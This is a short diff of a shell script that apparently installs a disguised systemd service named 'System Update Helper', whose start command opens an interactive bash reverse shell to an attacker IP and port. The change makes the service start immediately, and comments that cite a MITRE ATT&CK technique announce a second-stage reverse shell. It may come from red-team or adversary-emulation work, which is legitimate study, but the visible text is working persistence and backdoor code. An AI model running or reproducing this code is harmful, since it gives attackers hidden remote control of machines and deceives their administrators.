@@ -15,7 +15,7 @@ SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
 bash -c "printf '[Unit]\nDescription=System Update Helper\nAfter=network.target\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1\"\nRemainAfterExit=no\n\n[Install]\nWantedBy=multi-user.target\n' > ${SERVICE_FILE}"
 
 systemctl daemon-reload
-systemctl enable "$SERVICE_NAME" 2>/dev/null
+systemctl enable --now "$SERVICE_NAME" 2>/dev/null
 
 # --- Stage 2: T1059.004 — Immediate reverse shell ---
 # Try nc first; fall back to pure-bash /dev/tcp for OpenBSD nc compatibility
